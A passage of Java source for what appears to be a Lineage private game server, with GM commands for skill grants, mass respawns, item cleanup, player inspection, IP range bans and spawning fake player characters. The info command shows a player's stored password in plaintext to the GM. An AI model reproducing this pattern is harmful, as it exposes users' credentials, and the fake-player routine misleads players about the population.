				passives = PassiveLoader.getInstance().fromClassType(3);
				SC_AddSkill.send(pc, 255, 255, 127, 255, 255, 255, 255, 255, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
						0, 0, 0);
				L1Skills l1skills = null;
				for (cnt = 1; cnt <= 80; cnt++) {// LV1~10 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
			} else if (pc.isDarkelf()) {
				passives = PassiveLoader.getInstance().fromClassType(4);
				SC_AddSkill.send(pc, 255, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
				L1Skills l1skills = null;

				for (cnt = 1; cnt <= 16; cnt++) {// LV1~2 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}

				for (cnt = 97; cnt <= 112; cnt++) { // DE마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
				{
					l1skills = SkillsTable.getInstance().getTemplate(234); // 스킬 정보를 취득
					if(l1skills != null){
						skill_name = l1skills.getName();
						skill_id = l1skills.getSkillId();
						SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
					}
				}
				if (!pc.hasSkillEffect(L1SkillId.버닝)) {
					pc.버닝(true);
					pc.setSkillEffect(L1SkillId.버닝, -1);
				
				}
				if (!pc.hasSkillEffect(L1SkillId.이베이젼)) {
					pc.이베이젼(true);
					pc.setSkillEffect(L1SkillId.이베이젼, -1);
				
				}
				
			} else if (pc.isDragonknight()) {
				passives = PassiveLoader.getInstance().fromClassType(5);
				SC_AddSkill.send(pc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0, 0, 0, 0);
				L1Skills l1skills = null;
				for (cnt = 177; cnt <= 200; cnt++) { // 용기사스킬
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
			} else if (pc.isBlackwizard()) {
				passives = PassiveLoader.getInstance().fromClassType(6);
				SC_AddSkill.send(pc, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 0, 0, 0);
				L1Skills l1skills = null;
				for (cnt = 201; cnt <= 224; cnt++) { // 환술사스킬
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
				
				if (!pc.hasSkillEffect(L1SkillId.일루션리치)) {
					pc.일루션리치(true);
					pc.setSkillEffect(L1SkillId.일루션리치, -1);
				
				}
				if (!pc.hasSkillEffect(L1SkillId.일루션골렘)) {
					pc.일루션골렘(true);
					pc.setSkillEffect(L1SkillId.일루션골렘, -1);
				
				}
				
			} else if (pc.isWarrior()) {
				passives = PassiveLoader.getInstance().fromClassType(7);
				SC_AddSkill.send(pc, 255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 192, 7, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0); // 전사꺼
				L1Skills l1skills = null;

				for (cnt = 1; cnt <= 8; cnt++) {// LV1 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}

				for (cnt = 225; cnt <= 240; cnt++) {// 전사 마법
					l1skills = SkillsTable.getInstance().getTemplate(cnt); // 스킬 정보를 취득
					if(l1skills == null)
						continue;
					skill_name = l1skills.getName();
					skill_id = l1skills.getSkillId();
					SkillsTable.getInstance().spellMastery(object_id, skill_id, skill_name, 0, 0); // DB에 등록
				}
			}
			if(passives != null){
				for(PassiveInfo pInfo : passives){
					if(pc.isPassive(pInfo.getPassiveId()))
						continue;
					
					int passiveId = pInfo.getPassiveId();
					if(passiveId == PassiveID.DOUBLE_BREAK_DESTINY.toInt()){
						if(pc.hasSkillEffect(L1SkillId.DOUBLE_BRAKE))
							pc.removeSkillEffect(L1SkillId.DOUBLE_BRAKE);
					}
					pc.addPassive(pInfo);
					PassiveUserLoader.store(pc, pInfo);
				}
			}
			
			SC_SystemMessage.send(gm, "해당 캐릭터 스킬마스터 완료");
		} catch (Exception e) {
			SC_SystemMessage.send(gm, ".스킬마스터 [캐릭명] 명령하세요.");
		}
	}

	private static void BuilderCmd_npc_down(L1PcInstance pc, String cmdName, String poby) {
    try {
      StringTokenizer token = new StringTokenizer(poby);
      String type = token.nextToken();
      String spawn = token.nextToken();

      if (type.equals("몬스터")) {
        if (spawn.equals("배치")) {
          CNpcMakerDB.getInstance().reload();
 
          SC_PacketBox.broadcastGreen("[긴급공지] 월드전체 몬스터가 재배치 되었습니다.");
        } else if (spawn.equals("삭제")) {
          for (L1Object obj : CWorld.getInstance().getObject()) {
        		 if ((obj != null) && ((obj instanceof L1MonsterInstance))) {
        			 L1MonsterInstance mon = (L1MonsterInstance) obj;
        			 mon.setRespawn(false);
        			 mon.re();   
        		 }
          }
          SC_PacketBox.broadcastGreen("[긴급공지] 월드전체 몬스터가 삭제 되었습니다.");
        } else {
          throw new Exception();
        }
      } else if (type.equals("엔피씨")) {
        if (spawn.equals("배치")) {
        	NpcSpawnTable.getInstance().reload();

          SC_PacketBox.broadcastGreen("[긴급공지] 월드전체 NPC가 재배치 되었습니다.");
        } else if (spawn.equals("삭제")) {
          for (L1Object npc : CWorld.getInstance().getObject()) {
        		  if ((npc != null) && npc instanceof L1MerchantInstance) {
        			  L1MerchantInstance merchent = (L1MerchantInstance)npc;
	        			  merchent.setRespawn(false);
	        			  merchent.deleteMe();
                    }
                  }
         

          SC_PacketBox.broadcastGreen("[긴급공지] 월드전체 NPC가 삭제 되었습니다.");
        } else {
          throw new Exception();
        }
      }
      else throw new Exception(); 
    }
    catch (Exception e)
    {
    	SC_SystemMessage.send(pc, "." + cmdName + " <몬스터/엔피씨> <배치/삭제>");
    }
  }

	private static void BuilderCmd_server_name(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			int invid = Integer.parseInt(st.nextToken(), 10);
			int count = Integer.parseInt(st.nextToken(), 10);
			L1ItemInstance item = null;

			for (int i = 0; i < count; i++) {
				item = CObjectDB.LoadItem().createItem(40308);
				item.getItem().setName(String.valueOf("$" + (invid + i)));
				SC_SystemMessage.send(pc, (invid + i)+" : " + "$" + (invid + i));
			}
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, ".네임  [id] [출현시키는 수]로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_clear(L1PcInstance pc, String cmdName, String arg) {
		for (L1Object obj : CWorld.getInstance().getClusterGrid().queryNearby(pc, -1)) {
			if (!(obj instanceof L1MonsterInstance)) {
				continue;
			}

			L1MonsterInstance mob = (L1MonsterInstance) obj;

			// 이미 죽었거나 삭제 중인 객체는 제외
			if (mob.isDead() || mob.getCurrentHp() <= 0) {
				continue;
			}

			try {
				mob.receiveDamage(pc, mob.getCurrentHp());		

			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private static void BuilderCmd_describe(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String name = st.nextToken();
			L1PcInstance target = CWorld.getInstance(). getPlayer(name);
			if (target == null) {
				SC_ServerMessage.send(pc, 73, name); // \f1%0은 게임을 하고 있지 않습니다.
				return;
			}		
			if (!pc.isGm() && pc.getId() != target.getId()) {
				SC_ChatPacket.sendDirect(pc, pc, ".정보 명령어는 본인 캐릭터만 조회할 수 있습니다.");
				return;
			}
			int lv = target.getLevel();
			int currentLvExp = ExpTable.getExpByLevel(lv);
			int nextLvExp = ExpTable.getExpByLevel(lv + 1);
			double neededExp = nextLvExp - currentLvExp ;
			double currentExp =  target.getExp() - currentLvExp;
			int per = (int)((currentExp / neededExp) * 100.0);
			String typeName = null;
			switch(target.getType()){
			case 0:
				typeName = "군주";
				break;

			case 1:
				typeName = "기사";
				break;

			case 2:
				typeName = "요정";
				break;

			case 3:
				typeName = "마법사";
				break;

			case 4:
				typeName = "다크엘프";
				break;

			case 5:
				typeName = "용기사";
				break;

			case 6:
				typeName = "환술사";
				break;

			case 7:
				typeName = "전사";
				break;

			default:
				typeName = "????";
			}
			SC_SystemMessage.send(pc, "\\aD--------------------------------------------------");
			SC_SystemMessage.send(pc, "\\aD[ " + target.getName() + " ] 직업:" + typeName + ", 혈맹:" + target.getClanname());
			if (!target.noPlayerCK && pc.isGm()) {
				SC_SystemMessage.send(pc, "\\aD계정: " + target.getAccountName() + " / " + Account.load(target.getAccountName()).get_Password() + "   IP: " + target.getNetConnection().getIp());
			}	
			SC_SystemMessage.send(pc, "\\aD--------------------------------------------------");
			SC_SystemMessage.send(pc, "\\aL* Lv: " + lv +" (" + per + "%)" + "   방어: " + target.getAc() + "   마방: " + target.GetMDefendBySkill());  // 원본 target.getResistance().getMr()
			int hpr = target.getHpr();
			int mpr = target.getMpr();
			SC_ChatPacket.sendDirect(pc, pc, "* 피: " + target.getCurrentHp() + '/' + target.getMaxHp() + " (틱: " + hpr + ')' + "   엠: " + target.getCurrentMp() + '/' + target.getMaxMp() + " (틱: " + mpr + ')');
			SC_ChatPacket.sendDirect(pc, pc, "* 힘: " + target.GetTotalStatStr() + "  " + "덱: " + target.GetTotalStatDex() + "   "
					+ "콘: " + target.GetTotalStatCon() + "   " + "인: " + target.GetTotalStatInt() + "   "
					+ "위: " + target.GetTotalStatWis() + "   " + "카: " + target.GetTotalStatCha());
			SC_ChatPacket.sendDirect(pc, pc, "* 불: " + target.GetFireResist() + "  물: " + target.GetWaterResist() + "  바람: " + target.GetWindResist() + "  땅: " + target.GetEarthResist());		
			
			SC_ChatPacket.sendDirect(pc, pc, String.format("* 기술내성:%d 정령내성:%d 용언내성:%d 공포내성:%d 전체내성:%d", 
					target.GetSpecialResistance(eKind.ABILITY), 
					target.GetSpecialResistance(eKind.SPIRIT), 
					target.GetSpecialResistance(eKind.DRAGON_SPELL), 
					target.GetSpecialResistance(eKind.FEAR),
					target.GetSpecialResistance(eKind.ALL))); 
			
			SC_ChatPacket.sendDirect(pc, pc, String.format("* 기술적중:%d 정령적중:%d 용언적중:%d 공포적중:%d 전체적중:%d", 
					target.GetSpecialPierce(eKind.ABILITY), 
					target.GetSpecialPierce(eKind.SPIRIT), 
					target.GetSpecialPierce(eKind.DRAGON_SPELL), 
					target.GetSpecialPierce(eKind.FEAR),
					target.GetSpecialPierce(eKind.ALL))); 
			
			SC_ChatPacket.sendDirect(pc, pc, "* 추타: " + target.getDmgup() + "  공성: " + target.getHitup() + "  활타: " + target.getBowDmgup() + "  활명: " + target.getBowHitup() + "  주술: " + target.GetStatSp());
			SC_ChatPacket.sendDirect(pc, pc, "* 대미지감소: " + target.getDamageReductionByArmor() + " * 근거리치명타: " + target.get_melee_critical_rate());
			SC_ChatPacket.sendDirect(pc, pc, "* 원거리치명타: " + target.get_missile_critical_rate() + " * 마법치명타: " + target.getBaseMagicCritical());
			SC_ChatPacket.sendDirect(pc, pc, "* 대미지리덕션무시: " + target.getDamageReductionIgnore());
			SC_ChatPacket.sendDirect(pc, pc, "* PVP대미지: " + target.GetPvpDamage() +  " * PVP대미지감소: " + target.GetPvpDamageReduction());
			SC_SystemMessage.send(pc, "* HP: (" + target.getCurrentHp() + '/' + target.getMaxHp() + ") (HPr: " + hpr + ')' 
					+ " / MP: (" + target.getCurrentMp() + '/' + target.getMaxMp() + ") (MPr: " + mpr + ')');
SC_SystemMessage.send(pc, "\\aDBASE:(S: " + target.GetOriginalStatStr() + " / " + "D: " + target.GetOriginalStatDex() + " / " 
                        + "C: " + target.GetOriginalStatCon() + " / " + "I: " + target.GetOriginalStatInt() + " / " 
                        + "W: " + target.GetOriginalStatWis() + " / " + "C: " + target.GetOriginalStatCha() + ')');
SC_SystemMessage.send(pc, "\\aHREAL:(S: " + target.GetTotalStatStr() + " / " + "D: " + target.GetTotalStatDex() + " / "
						+ "C: " + target.GetTotalStatCon() + " / " + "I: " + target.GetTotalStatInt() + " / "
						+ "W: " + target.GetTotalStatWis() + " / " + "C: " + target.GetTotalStatCha() + ')');
			SC_SystemMessage.send(pc, "\\aD--------------------------------------------------");
		} catch (Exception e) {
			SC_ChatPacket.sendDirect(pc, pc, ".정보 [캐릭명] 으로 입력.");
		}
	}

	private static void BuilderCmd_delete_ground_item(L1PcInstance pc, String cmdName, String arg) {
		L1ItemInstance l1iteminstance = null;
	//	ArrayList<L1PcInstance> players = null;
	try{
		StringTokenizer st = new StringTokenizer(arg);
		String type = st.nextToken();
		if(type.equalsIgnoreCase("전체")){
			CInventory groundInventory= null;
			LetterTable lettertable = null;
			L1FurnitureInstance furniture = null;
			for (L1Object l1object : CWorld.getInstance().getObject()) {
				if (l1object instanceof L1ItemInstance) {
					l1iteminstance = (L1ItemInstance) l1object;
					if (l1iteminstance.getX() == 0 && l1iteminstance.getY() == 0) { // 지면상의 아이템은 아니고, 누군가의 소유물
						continue;
					}
					//
				//	players = CWorld.getInstance().getVisiblePlayer(l1iteminstance, 2);
				//	if (0 == players.size()) {
						groundInventory = CWorld.getInstance().getInventory(l1iteminstance.getX(), l1iteminstance.getY(), l1iteminstance.getMapId());
						int itemId = l1iteminstance.getItem(). getItemId();
						if (itemId >= 49016 && itemId <= 49025) { // 편지지
							lettertable = new LetterTable();
							lettertable.deleteLetter(l1iteminstance.getId());
						} else if (itemId >= 41383 && itemId <= 41400) { // 가구
							if (l1object instanceof L1FurnitureInstance) {
								furniture = (L1FurnitureInstance) l1object;
								if (furniture.getItemObjId() == l1iteminstance.getId()) { // 이미 꺼내고 있는 가구
									FurnitureSpawnTable.getInstance().deleteFurniture(furniture);
								}
							}
						}
						groundInventory.Pop(l1iteminstance);
						CWorld.getInstance().removeVisibleObject(l1iteminstance);
						CWorld.getInstance().removeObject(l1iteminstance);
					}
			}
		}else if(type.equalsIgnoreCase("맵")){
			CInventory groundInventory= null;
			LetterTable lettertable = null;
			L1FurnitureInstance furniture = null;
			for (L1Object l1object : CWorld.getInstance().getObject()) {
				if(l1object.getMapId() == pc.getMapId()){
					if (l1object instanceof L1ItemInstance) {
						l1iteminstance = (L1ItemInstance) l1object;
						if (l1iteminstance.getX() == 0 && l1iteminstance.getY() == 0) { // 지면상의 아이템은 아니고, 누군가의 소유물
							continue;
						}
				
							groundInventory = CWorld.getInstance().getInventory(l1iteminstance.getX(), l1iteminstance.getY(), l1iteminstance.getMapId());
							int itemId = l1iteminstance.getItem(). getItemId();
							if (itemId >= 49016 && itemId <= 49025) { // 편지지
								lettertable = new LetterTable();
								lettertable.deleteLetter(l1iteminstance.getId());
							} else if (itemId >= 41383 && itemId <= 41400) { // 가구
								if (l1object instanceof L1FurnitureInstance) {
									furniture = (L1FurnitureInstance) l1object;
									if (furniture.getItemObjId() == l1iteminstance.getId()) { // 이미 꺼내고 있는 가구
										FurnitureSpawnTable.getInstance().deleteFurniture(furniture);
									}
								}
							}
							groundInventory.Pop(l1iteminstance);
							CWorld.getInstance().removeVisibleObject(l1iteminstance);
							CWorld.getInstance().removeObject(l1iteminstance);
						}
				}
			}
		}else{
			SC_SystemMessage.send(pc, "청소 [맵,전체]");
		}
		//CWorld.getInstance().broadcastServerMessage("월드 맵상의 아이템이 GM에 의해 삭제되었습니다. ");
	} catch (Exception e) {
		SC_SystemMessage.send(pc, "청소 [맵,전체]");
	}
	}

	private static void BuilderCmd_check_character(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String name = st.nextToken(), type = st.nextToken();
			boolean equipment = "장비".equals(type);
			boolean inventory = equipment || "인벤".equals(type);
			if (!inventory && !"창고".equals(type) && !"요정창고".equals(type)) throw new IllegalArgumentException();
			final CUserSocket gmSocket = pc.getNetConnection();
			final int gmStamp = pc.getSessionStamp();
			L1PcInstance target = CWorld.getInstance().getPlayer(name);
			if (inventory && target != null && target.getNetConnection() != null) {
				builderOnItemOwner(pc, target, () -> {
					int rows = 0;
                    final Iterable<L1ItemInstance> checkedItems = equipment
                            ? java.util.Arrays.asList(target.getInventory().GetItemsByKinds(1, 2))
                            : target.getInventory().getItemSnapshot();
                    for (L1ItemInstance item : checkedItems) {
						builderReply(pc, gmSocket, gmStamp, "고유번호 " + item.getId() + " / "
								+ BuilderFormatInvenItem(item.getItemId(), item.getEnchantLevel(),
									item.isEquipped() ? 1 : 0, item.getCount(), item.getName(),
									item.getBless(), item.getAttrEnchantLevel()));
						rows++;
					}
					builderReply(pc, gmSocket, gmStamp, "현재 인벤토리 " + rows + "개 항목");
				});
				return;
			}
			// Read committed DB rows only; never create an object or force a save to inspect.
			final String sql = inventory
				? "SELECT i.id,i.item_id,i.enchantlvl,i.is_equipped,i.count,i.item_name,i.bless,i.attr_enchantlvl FROM character_items i JOIN characters c ON i.char_id=c.objid WHERE c.char_name=?"
				: "SELECT i.id,i.item_id,i.enchantlvl,0,i.count,i.item_name,i.bless,i.attr_enchantlvl FROM "
					+ ("창고".equals(type) ? "character_warehouse" : "character_elf_warehouse")
					+ " i JOIN characters c ON i.account_name=c.account_name WHERE c.char_name=?";
			CacheD.getInstance().submitDbJob(() -> {
				try (Connection con = DatabaseFactory.getInstance().getConnection();
					 PreparedStatement ps = con.prepareStatement(sql)) {
					ps.setString(1, name);
					int rows = 0;
					try (ResultSet rs = ps.executeQuery()) {
						while (rs.next()) {
							if (equipment) {
								L1Item template = CObjectDB.GetItem(rs.getInt(2));
								if (template == null || (template.getType2() != 1 && template.getType2() != 2)) continue;
							}
							builderReply(pc, gmSocket, gmStamp, "고유번호 " + rs.getInt(1) + " / "
									+ BuilderFormatInvenItem(rs.getInt(2), rs.getInt(3), rs.getInt(4),
										rs.getInt(5), rs.getString(6), rs.getInt(7), rs.getInt(8)));
							rows++;
						}
					}
					builderReply(pc, gmSocket, gmStamp, "DB 저장본 " + rows + "개 항목");
				} catch (SQLException e) { builderReply(pc, gmSocket, gmStamp, "아이템 조회 실패"); }
			});
		} catch (RuntimeException e) { SC_SystemMessage.send(pc, ".검사 [캐릭명] [장비,인벤,창고,요정창고]"); }
	}
	private static String BuilderFormatInvenItem(int itemid, int enchant, int equip, int count, String itemname, int bless, int attr){
		StringBuilder name = new StringBuilder();
		// +9 축복받은 실프의 흑왕도 (착용)		
		// 인챈
		if (enchant > 0) {
			name.append("+" + enchant + " ");
		} else if (enchant == 0) {
			name.append("");
		} else if (enchant < 0) {
			name.append(String.valueOf(enchant) + " ");
		}
		// 축복
		switch (bless) {
		case 0:name.append("축복받은 ");break;
		case 1:name.append("");break;		
		case 2:name.append("저주받은 ");break;
		default: break;
		}
		// 속성
		switch(attr){
		case 1:
			name.append("화령:1단 ");
			break;
		case 2:
			name.append("화령:2단 ");
			break;
		case 3:
			name.append("화령:3단 ");
			break;
		case 4:
			name.append("화령:4단 ");
			break;
		case 5:
			name.append("화령:5단 ");
			break;
		case 6:
			name.append("수령:1단 ");
			break;
		case 7:
			name.append("수령:2단 ");
			break;
		case 8:
			name.append("수령:3단 ");
			break;
		case 9:
			name.append("수령:4단 ");
			break;
		case 10:
			name.append("수령:5단 ");
			break;
		case 11:
			name.append("풍령:1단 ");
			break;
		case 12:
			name.append("풍령:2단 ");
			break;
		case 13:
			name.append("풍령:3단 ");
			break;
		case 14:
			name.append("풍령:4단 ");
			break;
		case 15:
			name.append("풍령:5단 ");
			break;
		case 16:
			name.append("지령:1단 ");
			break;
		case 17:
			name.append("지령:2단 ");
			break;
		case 18:
			name.append("지령:3단 ");
			break;
		case 19:
			name.append("지령:4단 ");
			break;
		case 20:
			name.append("지령:5단 ");
			break;
		default:
			break;
		}
		// 이름
		name.append(itemname + " ");
		// 착용여부
		if (equip == 1){
			name.append("(착용)");
		}
		switch (bless) {
		case 129:name.append("[봉인]");break;
		default: break;
		}
		// 카운트
		if (count > 1){
			name.append("(" + count + ")");
		}
		return name.toString();
	}

	private static void BuilderCmd_check_account(L1PcInstance pc, String cmdName, String arg) {
		try (Connection con = DatabaseFactory.getInstance().getConnection();
			 PreparedStatement ps = con.prepareStatement("SELECT a.login,a.lastactive,a.ip,a.host FROM accounts a JOIN characters c ON a.login=c.account_name WHERE c.char_name=?")) {
			ps.setString(1, new StringTokenizer(arg).nextToken());
			try (ResultSet rs = ps.executeQuery()) {
				if (!rs.next()) { SC_SystemMessage.send(pc, "계정이 없습니다."); return; }
				SC_SystemMessage.send(pc, "계정: " + rs.getString(1) + " 최근접속: " + rs.getString(2)
						+ " 접속IP: " + rs.getString(3) + " 생성IP: " + rs.getString(4));
			}
		} catch (Exception e) { SC_SystemMessage.send(pc, ".계정정보 [캐릭명]"); }
	}

	private static final Map<Integer, Integer> BUILDER_SPAWN_CURSOR = new java.util.concurrent.ConcurrentHashMap<>();

	private static void BuilderCmd_to_spawn(L1PcInstance pc, String cmdName, String arg) {
		try {
			if (! BUILDER_SPAWN_CURSOR.containsKey(pc.getId())) {
				BUILDER_SPAWN_CURSOR.put(pc.getId(), 0);
			}
			int id = BUILDER_SPAWN_CURSOR.get(pc.getId());
			if (arg.isEmpty() || arg.equals("+")) {
				id++;
			} else if (arg.equals("-")) {
				id--;
			} else {
				StringTokenizer st = new StringTokenizer(arg);
				id = Integer.parseInt(st.nextToken());
			}
			CNpcMaker spawn = NpcSpawnTable.getInstance(). getTemplate(id);
			if (spawn == null) {
				spawn = CNpcMakerDB.getInstance(). getTemplate(id);
			}
			if (spawn != null) {
				pc.start_teleport(spawn.getLocX(), spawn.getLocY(), spawn.getMapId(), 5, 169, false, false);
				SC_SystemMessage.send(pc, "spawnid(" + id	+ ")의 원래로 납니다");
			} else {
				SC_SystemMessage.send(pc, "spawnid(" + id	+ ")(은)는 발견되지 않습니다");
			}
			BUILDER_SPAWN_CURSOR.put(pc.getId(), id);
		} catch (Exception exception) {
			SC_SystemMessage.send(pc, cmdName + " [스폰아이디] [+,-]");
		}
	}

	private static void BuilderCmd_range_kick(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer st = new StringTokenizer(arg);
			String				sname	= st.nextToken();
			if(sname == null || sname.equalsIgnoreCase(""))
				throw new Exception("");
			
			Integer reason = SC_LoginResult.banServerCodes.get(Integer.parseInt(st.nextToken()));
			if(reason == null)
				throw new Exception("");
			
			L1PcInstance target = CWorld.getInstance().getPlayer(sname);
//			if (target == null) {
//				target = CharacterTable.getInstance().restoreCharacter(arg);
//			}

			if (target != null) {
				IpTable ip = IpTable.getInstance();

				Account.ban(target.getAccountName(), reason); // 계정을 BAN시킨다.
				ip.rangeBanIp(target.getNetConnection().getHostname());
				SC_SystemMessage.send(pc, target.getName() + "[" + pc.getNetConnection() + "] 를 광역추방 했습니다.");						
				CWorld.getInstance().removeObject(target);

				/*target.getNetConnection().kick();
				target.getNetConnection().close();
				target.logout();	
				SC_Disconnect.send(target);*/
//				if (target.getOnlineStatus() == 1) {
//					SC_Disconnect.send(target);
//				}
			} else {
				final ObjectWrapper<String> wrapper = new ObjectWrapper<String>();
				wrapper.value = "";
				Selector.exec("select account_name from characters where char_name=?", new SelectorHandler(){
					@Override
					public void handle(PreparedStatement pstm) throws Exception {
						pstm.setString(1, sname);
					}

					@Override
					public void result(ResultSet rs) throws Exception {
						while(rs.next()){
							wrapper.value = rs.getString("account_name");
						}
					}
					
				});
				if(GameUtils.isNullOrEmpty(wrapper.value)){
					SC_SystemMessage.send(pc, String.format("%s은(는) 존재하지 않는 캐릭터명입니다.", sname));					
				}else{
					IpTable ip = IpTable.getInstance();
					Account.ban(wrapper.value, reason); // 계정을 BAN시킨다.
					Integer[] octet = Account.loadAccountAddress(wrapper.value);
					StringBuilder sb = new StringBuilder(256);
					sb.append(sname).append("을 광역 추방했습니다.(").append(wrapper.value);
					if(octet != null){
						sb.append(", ").append(octet[0]).append(".").append(octet[1]).append(".").append(octet[2]).append(".").append("*");
						ip.rangeBanIp(octet);
					}
					sb.append(")");
					pc.sendPackets(sb.toString());
				}
			}
		} catch (Exception e) {
			SC_SystemMessage.send(pc, cmdName + " [캐릭터명] [정지사유번호]으로 입력해 주세요. ");
		}
	}

	private static void BuilderCmd_database_init(L1PcInstance pc, String cmdName, String arg) {
		SC_SystemMessage.send(pc, "실행 중인 게임 서버의 DB 초기화는 금지됩니다. 서버 종료 후 백업된 DB에서 작업하십시오.");
	}



	private static void BuilderSpawnError(L1PcInstance pc, String cmdName) {
		String errorMsg = cmdName + " npcid|name [수] [범위] 라고 입력해 주세요. ";
		SC_SystemMessage.send(pc, errorMsg);
	}

	private static int BuilderParseNpcId(String nameId) {
		int npcid = 0;
		try {
			npcid = Integer.parseInt(nameId);
		} catch (NumberFormatException e) {
			npcid = CObjectDB.LoadNPC().findNpcIdByNameWithoutSpace(nameId);
		}
		return npcid;
	}



	private static void BuilderCmd_spawn_npc(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer tok = new StringTokenizer(arg);
			String nameId = tok.nextToken();
			int count = 1;
			if (tok.hasMoreTokens()) {
				count = Integer.parseInt(tok.nextToken());
			}
			int randomrange = 0;
			if (tok.hasMoreTokens()) {
				randomrange = Integer.parseInt(tok.nextToken(), 10);
			}
			int npcid = BuilderParseNpcId(nameId);

			L1Npc npc = CObjectDB.GetNPC(npcid);
			if (npc == null) {
				SC_SystemMessage.send(pc, "해당 NPC가 발견되지 않습니다.");
				return;
			}
			
			for (int i = 0; i < count; i++) {
				L1SpawnUtil.spawnAndGet(pc, npcid, randomrange, 0);
				//L1SpawnUtil.spawn(pc, npcid, randomrange, 0);
			}

			String msg = String.format("%s(%d) (%d) 를 소환했습니다. (범위:%d)", npc
					.get_name(), npcid, count, randomrange);
			SC_SystemMessage.send(pc, msg);
		} catch (NoSuchElementException e) {
			BuilderSpawnError(pc, cmdName);
		} catch (NumberFormatException e) {
			BuilderSpawnError(pc, cmdName);
		} catch (Exception e) {
			e.printStackTrace();
			SC_SystemMessage.send(pc, cmdName + " 내부 에러입니다.");
		}
	}

	private static final Random BUILDER_FAKE_RANDOM = new Random(System.nanoTime());

	private static void BuilderCmd_fake_character(L1PcInstance pc, String cmdName, String arg) {
		try {
			StringTokenizer stringtokenizer = new StringTokenizer(arg);
			String name = stringtokenizer.nextToken();

			if (CharacterTable.getInstance().isContainNameList(name) || CWorld.getInstance().getPlayer(name) != null) {
				SC_SystemMessage.send(pc, "이미 존재하는 캐릭터 이름입니다");
				return;
			}
			L1PcInstance newPc = new L1PcInstance();
			newPc.setAccountName("");
			newPc.setId(IdFactory.getInstance().nextId());
			newPc.setName(name);
			newPc.setHighLevel(1);
			newPc.setExp(0);
			newPc.addBaseMaxHp((short)2000);//14
			newPc.setCurrentHp(2000);//14
			newPc.setDead(false);
			newPc.setStatus(0);
			newPc.addBaseMaxMp((short)2);
			newPc.setCurrentMp(2);			
			newPc.SetOriginalStatStr(16);
			newPc.SetStatStr(16);
			newPc.SetOriginalStatCon(16);
			newPc.SetStatCon(16);
			newPc.SetOriginalStatDex(11);
			newPc.SetStatDex(11);
			newPc.SetOriginalStatCha(13);
			newPc.SetStatCha(13);
			newPc.SetOriginalStatInt(12);
			newPc.SetStatInt(12);
			newPc.SetOriginalStatWis(11);
			newPc.SetStatWis(11);
			int ran = BUILDER_FAKE_RANDOM.nextInt(120);			
			if (ran >= 0 && ran < 15) { // 15 남기사가 15프로
				newPc.setClassId(61);
				newPc.setCurrentSprite(61);
				newPc.setType(61);
			} else if (ran >= 15 && ran < 20){ // 5// 여캐릭은 무조건 5프로 왜냐 프리섭은 여캐릭은 거의 안함.
				newPc.setClassId(48);
				newPc.setCurrentSprite(48);
				newPc.setType(48);
			} else if (ran >= 20 && ran < 30){ // 10
				newPc.setClassId(138);
				newPc.setCurrentSprite(138);
				newPc.setType(138);
			} else if (ran >= 30 && ran < 35){ // 5
				newPc.setClassId(37);
				newPc.setCurrentSprite(37);
				newPc.setType(37);
			} else if (ran >= 35 && ran < 45){ // 10
				newPc.setClassId(734);
				newPc.setCurrentSprite(734);
				newPc.setType(734);
			} else if (ran >= 45 && ran < 50){ // 5
				newPc.setClassId(1186);
				newPc.setCurrentSprite(1186);
				newPc.setType(1186);
			} else if (ran >= 50 && ran < 60){// 10
				newPc.setClassId(2786);
				newPc.setCurrentSprite(2786);
				newPc.setType(2786);
			} else if (ran >= 60 && ran < 65){ // 5
				newPc.setClassId(2796);
				newPc.setCurrentSprite(2796);
				newPc.setType(2796);
